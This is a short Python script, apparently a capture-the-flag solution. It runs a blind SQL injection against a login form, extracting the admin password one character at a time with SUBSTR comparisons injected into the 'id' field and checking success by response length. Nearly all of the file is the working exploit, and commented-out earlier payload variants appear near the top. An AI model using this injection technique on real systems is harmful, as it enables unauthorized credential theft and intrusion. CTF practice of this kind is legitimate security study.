import requests
import json

url = "http://ctfq.sweetduet.info:10080/~q6/"
# url = "http://localhost:8080/"

# payload = {'id': "admin", 'pass': "\' or SUBSTR((SELECT password FROM user WHERE id = \'admin\'), 1, 1) = \'F\' --"}
# payload = {'id': "admin", 'pass': "\' or SUBSTR((SELECT password FROM user WHERE id = \'admin\'), 1, 1) = \'F\' --"}
# # sql = "\' or SUBSTR((SELECT password FROM user WHERE id = \'admin\'), 1, 1) = \'F\' --"
# # payload = {'id' : 'admin', 'pass' : sql}
# print(payload['id'])
# r = requests.post(url, data=payload)
# print(r)
# print(r.text)
# print(len(r.text))

pass_length = 21
pass_ = ""

for i in range(pass_length):
  for j in range(33, 127):
    char = chr(j)
    payload = {'id': "\' or SUBSTR((SELECT pass FROM user WHERE id = \'admin\'), {start}, 1) = \'{chr}\' --".format(start=i+1, chr=char), 'pass': ''}
    print(payload['id'])
    r = requests.post(url, data=payload)
    if len(r.text) >= 1000:
      pass_ += char
      print("char determined:", char)
      break
    if j == 126:
      print("WRONG: DON'T MATCH ANY CHAR")
      print("pass_:", pass_)

print(pass_)